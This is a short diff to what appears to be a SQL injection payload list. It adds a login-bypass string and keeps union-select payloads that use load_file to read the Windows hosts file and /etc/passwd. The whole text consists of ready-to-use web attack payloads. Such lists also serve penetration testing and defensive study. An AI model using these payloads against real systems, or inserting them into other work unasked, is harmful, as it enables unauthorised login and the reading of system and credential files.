@@ -1,3 +1,6 @@
+# Basic SQLi
+login' or 1012=1024;#
+
 #Load file:
 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')
 union all select 1, 2, load_file('/etc/passwd')
